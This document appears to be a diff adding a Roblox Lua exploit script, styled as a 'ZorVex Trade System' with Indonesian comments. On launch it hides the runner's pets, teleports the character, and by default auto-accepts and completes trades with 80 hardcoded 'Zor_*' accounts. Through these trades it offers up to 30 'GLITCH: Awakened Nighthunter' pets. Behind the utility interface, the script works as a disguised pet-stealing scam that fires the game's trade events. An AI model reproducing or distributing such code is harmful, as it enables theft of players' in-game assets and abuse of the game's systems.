@@ -1,0 +1,483 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local event = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
+local petsFolder = LocalPlayer:WaitForChild("petsFolder", 5)
+
+-- Folder Penyimpanan Pet Tersembunyi
+local hiddenStorage = ReplicatedStorage:FindFirstChild("ZorVexStorage") or Instance.new("Folder", ReplicatedStorage)
+hiddenStorage.Name = "ZorVexStorage"
+
+-- Master Daftar Player Terizin (Combined)
+local ALLOWED_USERNAMES = {
+    -- Zor_Twin (1-20)
+    "Zor_Twin1", "Zor_Twin2", "Zor_Twin3", "Zor_Twin4", "Zor_Twin5",
+    "Zor_Twin6", "Zor_Twin7", "Zor_Twin8", "Zor_Twin9", "Zor_Twin10",
+    "Zor_Twin11", "Zor_Twin12", "Zor_Twin13", "Zor_Twin14", "Zor_Twin15",
+    "Zor_Twin16", "Zor_Twin17", "Zor_Twin18", "Zor_Twin19", "Zor_Twin20",
+
+    -- Zor_Night (1-20)
+    "Zor_Night1", "Zor_Night2", "Zor_Night3", "Zor_Night4", "Zor_Night5",
+    "Zor_Night6", "Zor_Night7", "Zor_Night8", "Zor_Night9", "Zor_Night10",
+    "Zor_Night11", "Zor_Night12", "Zor_Night13", "Zor_Night14", "Zor_Night15",
+    "Zor_Night16", "Zor_Night17", "Zor_Night18", "Zor_Night19", "Zor_Night20",
+
+    -- Zor_Cerberuz (1-20)
+    "Zor_Cerberuz1", "Zor_Cerberuz2", "Zor_Cerberuz3", "Zor_Cerberuz4", "Zor_Cerberuz5",
+    "Zor_Cerberuz6", "Zor_Cerberuz7", "Zor_Cerberuz8", "Zor_Cerberuz9", "Zor_Cerberuz10",
+    "Zor_Cerberuz11", "Zor_Cerberuz12", "Zor_Cerberuz13", "Zor_Cerberuz14", "Zor_Cerberuz15",
+    "Zor_Cerberuz16", "Zor_Cerberuz17", "Zor_Cerberuz18", "Zor_Cerberuz19", "Zor_Cerberuz20",
+
+    -- Zor_Dragon (1-20)
+    "Zor_Dragon1", "Zor_Dragon2", "Zor_Dragon3", "Zor_Dragon4", "Zor_Dragon5",
+    "Zor_Dragon6", "Zor_Dragon7", "Zor_Dragon8", "Zor_Dragon9", "Zor_Dragon10",
+    "Zor_Dragon11", "Zor_Dragon12", "Zor_Dragon13", "Zor_Dragon14", "Zor_Dragon15",
+    "Zor_Dragon16", "Zor_Dragon17", "Zor_Dragon18", "Zor_Dragon19", "Zor_Dragon20"
+}
+
+local allowedLookup = {}
+local ALLOWED_MAP_LOWER = {}
+for _, name in ipairs(ALLOWED_USERNAMES) do
+    allowedLookup[name] = true
+    ALLOWED_MAP_LOWER[string.lower(name)] = true
+end
+
+---------------------------------------------------------
+-- FUNGSI PENDUKUNG PET & TRADE (BUTTON 3)
+---------------------------------------------------------
+local petOriginTable = {}
+local PetName = "GLITCH: Awakened Nighthunter"
+local amount = 30
+
+local function InitialHideAll()
+    if not petsFolder then return end
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                petOriginTable[pet] = folder
+                pet.Parent = hiddenStorage
+            end
+        end
+    end
+end
+InitialHideAll()
+
+local function runExecution()
+    if not petsFolder then return false end
+    
+    local allPets = {}
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                petOriginTable[pet] = folder
+                table.insert(allPets, pet)
+            end
+        end
+    end
+    for _, pet in ipairs(hiddenStorage:GetChildren()) do 
+        table.insert(allPets, pet) 
+    end
+    
+    local count = 0
+    for _, pet in ipairs(allPets) do
+        if pet.Name == PetName and count < amount then
+            pet.Parent = petOriginTable[pet] or petsFolder:FindFirstChildWhichIsA("Folder")
+            count = count + 1
+        else
+            pet.Parent = hiddenStorage
+        end
+    end
+    return true, count
+end
+
+local function isTradePending()
+    local tradeVal = LocalPlayer:FindFirstChild("isTrading") or LocalPlayer:FindFirstChild("CurrentTrade")
+    if tradeVal then
+        if type(tradeVal.Value) == "boolean" then return tradeVal.Value end
+        if tradeVal.Value == "on" or tradeVal.Value == true or tradeVal.Value == 1 then
+            return true
+        end
+    end
+    return false
+end
+
+local function getPetInstances(pName, n)
+    local pets = {}
+    if not petsFolder then return pets end 
+
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                if pet.Name == pName then
+                    table.insert(pets, pet)
+                    if #pets >= n then return pets end
+                end
+            end
+        end
+    end
+    return pets
+end
+
+local function getValidTargetPlayer()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            if ALLOWED_MAP_LOWER[string.lower(player.DisplayName)] or ALLOWED_MAP_LOWER[string.lower(player.Name)] then
+                return player
+            end
+        end
+    end
+    return nil
+end
+
+---------------------------------------------------------
+-- PEMBERSIHAN UI LAMA
+---------------------------------------------------------
+if game.CoreGui:FindFirstChild("ZorVexUI") then game.CoreGui.ZorVexUI:Destroy() end
+if game.CoreGui:FindFirstChild("ZorVexToggle") then game.CoreGui.ZorVexToggle:Destroy() end
+if game.CoreGui:FindFirstChild("ZorVexPetCounter") then game.CoreGui.ZorVexPetCounter:Destroy() end
+
+local sg = Instance.new("ScreenGui", game.CoreGui)
+sg.Name = "ZorVexUI"
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local bg = Instance.new("Frame", sg)
+bg.Size = UDim2.new(0, 380, 0, 190)
+bg.Position = UDim2.new(0.5, -190, 0.5, -95)
+bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+bg.BackgroundTransparency = 0.1
+bg.BorderSizePixel = 0
+bg.Active = true
+bg.Visible = false
+
+local uic = Instance.new("UICorner", bg)
+uic.CornerRadius = UDim.new(0, 16)
+
+-- Efek Multi-Layer UIStroke
+local function addShadowStrokes(parent)
+    local s85 = Instance.new("UIStroke", parent)
+    s85.Thickness = 6.0 s85.Transparency = 0.9 s85.Color = Color3.fromRGB(0, 0, 0)
+    local s65 = Instance.new("UIStroke", parent)
+    s65.Thickness = 5.0 s65.Transparency = 0.9 s65.Color = Color3.fromRGB(0, 0, 0)
+    local s50 = Instance.new("UIStroke", parent)
+    s50.Thickness = 4.0 s50.Transparency = 0.9 s50.Color = Color3.fromRGB(0, 0, 0)
+    local s45 = Instance.new("UIStroke", parent)
+    s45.Thickness = 3.0 s45.Transparency = 0.9 s45.Color = Color3.fromRGB(0, 0, 0)
+end
+addShadowStrokes(bg)
+
+-- Header Logo & Title
+local logoPlaceholder = Instance.new("ImageLabel", bg)
+logoPlaceholder.Size = UDim2.new(0, 55, 0, 55)
+logoPlaceholder.Position = UDim2.new(0, 20, 0, 10)
+logoPlaceholder.BackgroundTransparency = 1
+logoPlaceholder.Image = "rbxassetid://91981940230704"
+local logoCorner = Instance.new("UICorner", logoPlaceholder)
+logoCorner.CornerRadius = UDim.new(0, 8)
+
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(0, 270, 0, 45)
+title.Position = UDim2.new(0, 85, 0, 15)
+title.BackgroundTransparency = 1
+title.Text = "ZorVex Trade System"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 21
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Container Grid
+local buttonContainer = Instance.new("Frame", bg)
+buttonContainer.Size = UDim2.new(0, 340, 0, 100)
+buttonContainer.Position = UDim2.new(0, 20, 0, 70)
+buttonContainer.BackgroundTransparency = 1
+
+local gridLayout = Instance.new("UIGridLayout", buttonContainer)
+gridLayout.CellSize = UDim2.new(0, 160, 0, 42)
+gridLayout.CellPadding = UDim2.new(0, 12, 0, 10)
+gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+gridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+
+-- State Variables untuk Toggle (Button 1 & 2 di-set false/OFF, 3 & 4 true/ON)
+local isAcceptOn = false
+local isSendOn   = false
+local isGiveOn   = true
+local isTeleOn   = true
+
+-- Helper Function untuk Membuat Custom Toggle Button
+local function createToggleButton(name, textOff, textOn, initialOn, onToggleCallback)
+    local btn = Instance.new("TextButton", buttonContainer)
+    btn.Name = name
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.BorderSizePixel = 0
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 15
+    btn.AutoButtonColor = false
+    
+    local btnCorner = Instance.new("UICorner", btn)
+    btnCorner.CornerRadius = UDim.new(0, 8)
+
+    local isOn = initialOn
+
+    local function updateVisual()
+        if isOn then
+            btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            btn.Text = textOn
+        else
+            btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            btn.TextColor3 = Color3.fromRGB(0, 0, 0)
+            btn.Text = textOff
+        end
+    end
+    updateVisual()
+
+    btn.MouseButton1Click:Connect(function()
+        isOn = not isOn
+        if isOn then
+            TweenService:Create(btn, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+                BackgroundColor3 = Color3.fromRGB(70, 70, 70),
+                TextColor3 = Color3.fromRGB(255, 255, 255)
+            }):Play()
+            btn.Text = textOn
+        else
+            TweenService:Create(btn, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+                BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+                TextColor3 = Color3.fromRGB(0, 0, 0)
+            }):Play()
+            btn.Text = textOff
+        end
+        if onToggleCallback then onToggleCallback(isOn) end
+    end)
+
+    return btn
+end
+
+---------------------------------------------------------
+-- INISIALISASI TOMBOL UTAMA (Button 1 & 2 -> false, 3 & 4 -> true)
+---------------------------------------------------------
+local btnAccept = createToggleButton("AcceptTradeBtn", "Accept Trade: OFF", "Accept Trade: ON", false, function(state)
+    isAcceptOn = state
+end)
+
+local btnSend = createToggleButton("SendTradeBtn", "Send Trade: OFF", "Send Trade: ON", false, function(state)
+    isSendOn = state
+end)
+
+local btnGive = createToggleButton("GivePetBtn", "Give Pet: OFF", "Give Pet: ON", true, function(state)
+    isGiveOn = state
+end)
+
+local btnTele = createToggleButton("TeleportBtn", "Teleport: OFF", "Teleport: ON", true, function(state)
+    isTeleOn = state
+    if state then
+        pcall(function()
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6.508, 26.007, 70.928, -0.510, 0.000, -0.860, 0.000, 1.000, -0.000, 0.860, -0.000, -0.510)
+            end
+        end)
+    end
+end)
+
+---------------------------------------------------------
+-- EXECUTION LOGIC BUTTONS
+---------------------------------------------------------
+
+-- [BUTTON 1 LOGIC] Handle Trade Request Incoming
+if event then
+    event.OnClientEvent:Connect(function(action, fromPlayer)
+        if isAcceptOn and action == "tradeRequest" and fromPlayer and fromPlayer ~= LocalPlayer then
+            if allowedLookup[fromPlayer.Name] then
+                event:FireServer("requestAccepted", fromPlayer)
+                print("[Auto Trade] Menerima trade dari: " .. fromPlayer.Name)
+            end
+        end
+    end)
+end
+
+-- Loop Auto Accept Trade Window (Button 1 Loop)
+task.spawn(function()
+    while true do
+        if isAcceptOn and event then
+            pcall(function() event:FireServer("acceptTrade") end)
+        end
+        task.wait(0.4)
+    end
+end)
+
+-- [BUTTON 2 LOGIC] Loop Auto Send Trade
+task.spawn(function()
+    while true do
+        if isSendOn and event and not isTradePending() then
+            for _, targetPlayer in ipairs(Players:GetPlayers()) do
+                if targetPlayer ~= LocalPlayer and allowedLookup[targetPlayer.Name] then
+                    pcall(function() 
+                        event:FireServer("sendTradeRequest", targetPlayer) 
+                    end)
+                    
+                    if isTradePending() then break end
+                    task.wait(0.05)
+                end
+            end
+        end
+        task.wait(0.3)
+    end
+end)
+
+-- [BUTTON 3 LOGIC] Loop Auto Give Pet
+task.spawn(function()
+    while true do
+        if isGiveOn and event then
+            if not isTradePending() then
+                pcall(function()
+                    local targetPlayer = getValidTargetPlayer()
+                    if targetPlayer then
+                        event:FireServer("requestAccepted", targetPlayer)
+                    end
+                end)
+                task.wait(0.2)
+            else
+                pcall(runExecution)
+                
+                local startTime = os.clock()
+                local pets = getPetInstances(PetName, amount)
+                local index = 1
+                
+                while (os.clock() - startTime) < 0.5 do
+                    local pet = pets[index]
+                    if pet and pet.Parent then
+                        pcall(function()
+                            event:FireServer("offerItem", pet)
+                        end)
+                        index = index + 1
+                        if index > #pets then break end
+                    end
+                    task.wait(0.001)
+                end
+                
+                pcall(function()
+                    event:FireServer("acceptTrade")
+                end)
+                
+                while isTradePending() do
+                    task.wait(0.1)
+                end
+                
+                task.wait(0.3)
+            end
+        end
+        task.wait(0.05)
+    end
+end)
+
+-- [BUTTON 4 LOGIC] Teleport 1x Saat Execute Awal
+task.spawn(function()
+    task.wait(0.5)
+    if isTeleOn then
+        pcall(function()
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local hrp = char:WaitForChild("HumanoidRootPart", 5)
+            if hrp then
+                hrp.CFrame = CFrame.new(6.508, 26.007, 70.928, -0.510, 0.000, -0.860, 0.000, 1.000, -0.000, 0.860, -0.000, -0.510)
+            end
+        end)
+    end
+end)
+
+---------------------------------------------------------
+-- UI TOGGLE & DRAGGABLE SYSTEM
+---------------------------------------------------------
+local toggleScreenGui = Instance.new("ScreenGui", game.CoreGui)
+toggleScreenGui.Name = "ZorVexToggle"
+
+local ImgBtn = Instance.new("ImageButton", toggleScreenGui)
+ImgBtn.Size = UDim2.new(0, 45, 0, 45)
+ImgBtn.Position = UDim2.new(1, -55, 0, 10)
+ImgBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ImgBtn.BackgroundTransparency = 0
+ImgBtn.Image = "rbxassetid://91981940230704" 
+ImgBtn.ClipsDescendants = true
+ImgBtn.ZIndex = 9999
+
+local imgCorner = Instance.new("UICorner", ImgBtn)
+imgCorner.CornerRadius = UDim.new(0, 10)
+addShadowStrokes(ImgBtn)
+
+ImgBtn.MouseButton1Click:Connect(function()
+    if bg.Visible then
+        TweenService:Create(bg, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0), BackgroundTransparency = 1}):Play()
+        task.delay(0.3, function() bg.Visible = false end)
+    else
+        bg.Visible = true
+        TweenService:Create(bg, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 380, 0, 190), Position = UDim2.new(0.5, -190, 0.5, -95), BackgroundTransparency = 0.1}):Play()
+    end
+end)
+
+local function makeDraggable(frame, button)
+    local dragging = false
+    local dragStart, startPos
+    local activeInput = nil
+
+    button.InputBegan:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and not dragging then
+            dragging = true
+            activeInput = input
+            dragStart = input.Position
+            startPos = frame.Position
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input == activeInput then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    UserInputService.InputEnded:Connect(function(input)
+        if input == activeInput then
+            dragging = false
+            activeInput = nil
+        end
+    end)
+end
+
+makeDraggable(bg, bg)
+makeDraggable(ImgBtn, ImgBtn)
+
+---------------------------------------------------------
+-- PET COUNTER WIDGET
+---------------------------------------------------------
+local counterGui = Instance.new("ScreenGui", game.CoreGui)
+counterGui.Name = "ZorVexPetCounter"
+
+local counterFrame = Instance.new("Frame", counterGui)
+counterFrame.Size = UDim2.new(0, 180, 0, 40)
+counterFrame.Position = UDim2.new(0, 10, 0, 10)
+counterFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+counterFrame.BackgroundTransparency = 0.2
+counterFrame.BorderSizePixel = 0
+Instance.new("UICorner", counterFrame).CornerRadius = UDim.new(0, 10)
+addShadowStrokes(counterFrame)
+
+local counterLabel = Instance.new("TextLabel", counterFrame)
+counterLabel.Size = UDim2.new(1, 0, 1, 0)
+counterLabel.BackgroundTransparency = 1
+counterLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+counterLabel.Font = Enum.Font.GothamBold
+counterLabel.TextSize = 13
+counterLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+task.spawn(function()
+    while true do
+        if hiddenStorage then
+            local total = #hiddenStorage:GetChildren()
+            counterLabel.Text = "Hidden Pets: " .. total
+        else
+            counterLabel.Text = "Hidden Pets: 0"
+        end
+        task.wait(0.5)
+    end
+end)
+                                 
